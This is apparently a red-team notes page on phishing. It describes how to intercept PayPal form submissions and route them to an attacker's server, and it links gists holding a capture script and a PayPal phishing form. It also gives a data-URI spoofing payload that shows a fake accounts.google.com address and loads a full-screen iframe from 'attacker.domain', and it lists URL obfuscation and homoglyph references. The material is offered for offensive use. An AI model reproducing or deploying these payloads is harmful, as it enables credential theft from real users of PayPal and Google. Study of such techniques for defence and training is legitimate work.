Targeting PayPal example
If were wanted to use PayPal for phishing, we would like our custom JavaScript code to do the following:
1. Run on HTML form load
2. Intercept all requests directed to PayPal
3. Route all requests to our server, eventhough the victims browser still communicate with the original PayPal webpage.

* capture_redirect.js: https://gist.github.com/anonymous/3bf8342c76eba4da3f660cbffa24f5d8
* PayPal phishing HTML form: https://gist.github.com/anonymous/75b5eb6578bbc5bfcabe44e8fbb952ea
* jquery hashchange.min.js: https://gist.github.com/anonymous/950a70cdebd3e78b6e88312fa7d93250


## Data URIs
A common technique for URL spoofing is abusing the data URI scheme.
The Data URI can show media content in a web browser without hosting the actual data on the internet.
Data URIs follow this scheme:
`data:[<mediatype>][;base64],<data>`
Here, `<mediatype>` is one of the MIME media types.
* https://gist.github.com/anonymous/907cc8e9dcc43c6a4412e682e5d5c2cd

Notice the amount of space characters `data:text/html,https://accounts.google.com` part is visible by the target. The data:text/html part could also be used in the following manner data:text/html;base64,[base64 encoded HTML source].
```
<meta http equiv="Refresh" content="0;url=data:text/html,https://accounts.google.com
<iframe src='http://attacker.domain' style='z-index:9999;overflow:hidden;position:fixed;top:0px;left:0px;bottom:0px;right:0px;width:100%;height:100%; border:none;margin:0;padding:0;'> Your browser doesn't support iFrames</iframe>">
```

## Obfuscation
* [Dotless IP addresses and URL Obfuscation](https://web.archive.org/web/20140702141151/http:/morph3us.org/blog/index.php?/archives/35-Dotless-IP-addresses-and-URL-Obfuscation.html)
* [Out of Character: Use of Punycode and Homoglyph Attacks to Obfuscate URLs for Phishing](http://www.irongeek.com/i.php?page=security/out-of-character-use-of-punycode-and-homoglyph-attacks-to-obfuscate-urls-for-phishing)
* [How to Obscure Any URL](http://www.pc-help.org/obscure.htm#how)bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/)
* [Unicode Domains are bad](https://www.vgrsec.com/post20170219.html)
* [Phishing with Unicode Domains](https://www.xudongz.com/blog/2017/idn-phishing/)


## Tools
########
########

```meta
ttp: T1000
internal: false
requirements:
results: user, admin
description: Use open redirects to phish victims
```